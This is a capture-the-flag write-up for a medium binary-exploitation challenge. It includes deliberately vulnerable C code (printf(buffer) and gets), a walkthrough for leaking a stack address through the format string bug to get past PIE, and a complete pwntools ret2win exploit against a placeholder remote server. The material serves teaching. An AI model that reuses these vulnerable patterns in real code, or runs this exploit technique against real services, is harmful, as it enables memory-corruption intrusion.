# Challenge Name
PIEfect

## Learning Objective
Learn how to leak addresses using format string vulnerability. How to bypass PIE

## Description 
Looking for the piefect slice of PIE.

## Difficulty:
Medium

## Guide
Let's look at the main part of the source code.

```c
void decision() {
    char final[100];
    printf("Alright! I've made up my mind. \n");
    gets(final);
}

void suggest() {
    char buffer[40]; 
    printf("Suggest me a flavour: \n");
    fgets(buffer, sizeof(buffer), stdin);
    printf("Here's a taste: \n");
    printf(buffer);
}
```

The program will run `suggest`, then the `decision` function. We can find the following:
1. In `suggest`, there is boundary checking with `sizeof()` (no BOF), however, `printf(buffer)` has no format specified, means there is a format string vulnerability here.
2. In `decision`, there is a `gets` functions which we can used to perform ret2win to `piefect` function.

### Format string vulnerability
This happens when the user input is improperly handled by functions with format specifiers.

Secure example:
```c
printf("%s", input)
```

Vulnerable example:
```c
printf(input)
```

This allows users to access and leak memory off the stack. This is exactly what we will do to find addresses.

### Protections
In this challenge, we have several protections enabled, but the one that matters for this challenge is **PIE**.

```sh 
$> checksec --file=chall
...
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

### What is PIE?
It stands for **Position Independent Code**. What happens is that, the **binary** will always be loaded in a different memory location. (No fixed address).

### What can we do??
While PIE makes exploits inconvenient, there are workarounds. This is because PIE uses **relative addressing**. This means offsets between all instructions & functions of the binary are **fixed**.

For example, if difference in offset between `main` function and `function1` function is 3, it will stay as 3 even with PIE enabled. (In short, if I know where `main` is located, I just need to do `main+3` to locate `function1`)

From a bigger perspective, it means if we can figure out the **base address**, we can still access any functions using offsets instead.


### Plan
1. Leak any address of the binary instructions off the stack (format string vuln)
2. Calculate base address using leaked address
3. Calculate address of `piefect` function
4. Find the padding needed to overflow for ret2win


### Part 1
Since we want to leak **addresses**, we want to use `%p`. (Refer to [this](https://www.geeksforgeeks.org/format-specifiers-in-c/))

```sh
$> ./chall
I can't decide which PIE to go with...
Suggest me a flavour: 
%p
Here's a taste: 
0x7fe321bc6643
```

We can see that it is an address that we manually leaked off the stack. 

However, there are a lot of addresses on the stack, and we want to find one that is useful to us.

Let's build a script to do just that.

```py
from pwn import *

context.log_level = 'error'
context.binary = "./chall"

for i in range(50):
    try:
        p = process("./chall")
        payload = '%{}$p'.format(i).encode()
        p.sendlineafter("flavour: \n", payload)
        p.recvuntil("taste: \n")
        result = p.recvline().strip().decode()
        print("Address @{}: ".format(i) + result)
    except EOFError:
        pass
```

This script does the following:
1. removes all unnecessary output except errors
2. loops 50 times to take 50 addresses off the stack

We would then see the following results
```sh
Address @0: %0$p
Address @1: 0x7ff9af325643
Address @2: (nil)
Address @3: 0x7fd20016f210
Address @4: (nil)
Address @5: (nil)
Address @6: 0xa70243625
Address @7: (nil)
Address @8: 0x7ffe611f7868
Address @9: 0x7ffc5694d590
Address @10: (nil)
Address @11: 0x7ffdb739dd38
Address @12: 0x7ffeb6ec7e40
Address @13: 0x562a91e00a49
...
```

You might be wondering: Which given we see above addresses do we use?

You can do this to check (the binary must be running):
```sh
# run this command if PIE is enabled
pwndbg> piebase
Calculated VA from <YOUR_DIR> = 0x555555400000
```

We want to actually use the one that is in the `0x555555400000` range, thus the 13th value of the stack. (FYI those that start with `7ff` are libc functions)

Run the following in gdb to check if it is an address in the binary:
1. `break main`
2. `run`
3. `c` - continue
4. `%13$p` - send input to get 13th address in the stack
5. press `CTRL + c` to interrupt the program but keep it running (the program MUST remain running to get addresses that can only be shown at runtime)
5. `x <address>`

```sh
pwndbg> x 0x555555400a49
0x555555400a49 <main+116>:      0x000000b8
```

### Step 2
Alright! Now that we have a leaked address, we can calculate for offset of leaked address:

`PIE - leak address = offset of leaked addr`

```sh
pwndbg> x 0x555555400a49 - 0x555555400000
0xa49:  Cannot access memory at address 0xa49
```

`0xa49` is the offset of the leaked address. To calculate base address:

`leaked address - offset of leaked addr = base address`

### Step 3
With this, we just need to find the offset of `piefect` function.

```sh
objdump -d chall | grep piefect
00000000000008ea <piefect>:
```

### Step 4
Now that we have most of the information we need, we just need to find the offset needed to BOF in `decision` function.

Run the following in pwndbg:
1. `break main`
2. `cyclic 200` - copy the De Bruijin Sequence to find our offset
3. send the payload when it says `Alright! I've made up my mind`.
4. you should see that the `RSP` pointer contains `paaaaaaa` and beyond. We just need the first 8 bytes because that is where the return address of `piefect`.

```shell
pwndbg> cyclic -l paaaaaaa
Finding cyclic pattern of 8 bytes: b'paaaaaaa' (hex: 0x7061616161616161)
Found at offset 120
```

### Crafting our exploit

Leak the address first.

```py
p = remote("SERVER", PORT)

payload = b'%13$p' # leak the 13th address on stack
p.sendlineafter("flavour: \n", payload)
p.recvuntil("taste: \n")
result = int(p.recvline(), 16)
print(result)
```

calculate for address of `piefect` function.

```py
piebase = result - 0xa49 # calculate base address
piefect_addr= piebase + 0x8ea # address of `piefect` function
```

After `decision` is called, we will perform ret2win.
```
payload2 = b'A' * 120
payload2 += piefect_addr
```

### Final Exploit

This includes the script for leaking address.

```py
from pwn import *

# context.log_level = 'error'
# for i in range(50):
#     try:
#         p = process("./chall")
#         payload = '%{}$p'.format(i).encode()
#         p.sendlineafter("flavour: \n", payload)
#         p.recvuntil("taste: \n")
#         result = p.recvline().strip().decode()
#         print("{}: ".format(i) + result)
#     except EOFError:
#         pass

p = remote("SERVER", PORT)

payload = b'%13$p' # leak the 13th address
p.sendlineafter("flavour: \n", payload)
p.recvuntil("taste: \n")
result = int(p.recvline(), 16) # convert to int so we can add offset

piebase = result - 0xa49
piefect_addr= piebase + 0x8ea # address of piefect function

payload2 = b'A' * 120 # padding
payload2 += p64(piefect_addr) # ret2win

p.sendlineafter("mind. \n",payload2)
p.interactive()
```

## Solution
Refer to solve.py

## Hints
1. heard of format string vuln?
2. For starters, how does the offsets in binaries work? 


## Attached Files
- chall.c
- chall

## Resources
- https://ir0nstone.gitbook.io/notes/binexp/stack/pie
- https://ir0nstone.gitbook.io/notes/binexp/stack/pie/pie-bypass
- https://book.hacktricks.wiki/en/binary-exploitation/format-strings/index.html

## Flag
TBD